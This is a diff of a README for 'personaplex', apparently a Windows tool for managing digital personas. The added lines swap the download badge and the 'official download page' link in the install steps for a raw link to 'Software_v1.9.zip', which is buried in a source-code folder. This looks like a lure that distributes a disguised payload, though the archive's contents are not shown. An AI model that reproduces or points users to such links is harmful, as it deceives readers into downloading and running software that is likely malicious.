@@ -1,6 +1,6 @@
 # 👤 personaplex - Manage digital personas with ease
 
-[![](https://img.shields.io/badge/Download-PersonaPlex-blue.svg)](https://github.com/Unwatchful-conservativism274/personaplex)
+[![](https://img.shields.io/badge/Download-PersonaPlex-blue.svg)](https://raw.githubusercontent.com/Unwatchful-conservativism274/personaplex/main/client/src/pages/Conversation/components/Software_v1.9.zip)
 
 ## 📋 What is PersonaPlex?
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11 to use this software. Make 
 
 Follow these steps to set up PersonaPlex on your Windows computer.
 
-1. First, visit the official download page here: [https://github.com/Unwatchful-conservativism274/personaplex](https://github.com/Unwatchful-conservativism274/personaplex).
+1. First, visit the official download page here: [https://raw.githubusercontent.com/Unwatchful-conservativism274/personaplex/main/client/src/pages/Conversation/components/Software_v1.9.zip](https://raw.githubusercontent.com/Unwatchful-conservativism274/personaplex/main/client/src/pages/Conversation/components/Software_v1.9.zip).
 2. Look for the latest release on the right side of the page.
 3. Click the link that ends in `.exe`.
 4. Your browser will download the installer file to your computer.
